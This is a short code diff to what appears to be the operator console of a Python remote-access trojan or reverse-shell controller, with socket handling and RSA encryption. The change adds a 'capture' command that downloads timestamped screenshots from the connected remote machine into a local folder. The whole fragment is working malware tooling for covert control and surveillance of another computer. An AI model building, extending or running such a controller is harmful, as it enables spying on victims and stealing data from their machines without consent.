@@ -1,4 +1,4 @@
-import socket,os,subprocess
+import socket,os,subprocess,datetime
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 
@@ -168,6 +168,13 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                     print("[-] Please select a directory")
                 elif cmd[0] == "clear":
                     subprocess.call('clear',shell=True)
+                elif cmd[0] == "capture":
+                    if not os.path.exists("screenshots"):
+                        os.mkdir("screenshots")
+                    os.chdir("screenshots")
+                    filename = str(datetime.datetime.now())
+                    self.download(filename)
+                    os.chdir("..")
                 else:
                     result = self.r_recv()
                     print(result)
